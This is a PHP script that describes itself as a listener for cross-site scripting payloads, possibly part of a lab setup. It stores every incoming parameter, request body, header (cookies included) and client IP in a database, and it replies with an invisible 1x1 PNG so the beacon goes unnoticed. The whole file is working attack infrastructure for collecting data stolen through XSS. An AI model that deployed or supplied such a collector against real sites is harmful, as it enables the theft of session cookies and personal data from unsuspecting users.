<?php
// This script acts as a listener for XSS payloads to send data to.
// It logs whatever receives into the database.

require_once 'config.php';

// Allow CORS so we can fetch this from anywhere if needed (though local is same origin)
header("Access-Control-Allow-Origin: *");

$data = "";

// Capture GET parameters
if (!empty($_GET)) {
    $data .= "GET: " . print_r($_GET, true);
}

// Capture POST parameters
if (!empty($_POST)) {
    $data .= "\nPOST: " . print_r($_POST, true);
} // Capture Raw Body (e.g. JSON)
else {
    $raw = file_get_contents('php://input');
    if ($raw) {
        $data .= "\nBODY: " . $raw;
    }
}

// Capture Headers (Cookies, User Agent, etc.)
$headers = getAllHeaders();
$data .= "\nHeaders: " . print_r($headers, true);

// Capture IP
$data .= "\nIP: " . $_SERVER['REMOTE_ADDR'];

if ($data) {
    $stmt = $conn->prepare("INSERT INTO xss_logs (data) VALUES (?)");
    $stmt->bind_param("s", $data);
    $stmt->execute();
    $stmt->close();
}

// Return a 1x1 invisible pixel or just empty response
header("Content-Type: image/png");
// Base64 encoded 1x1 transparent PNG
echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=');
?>
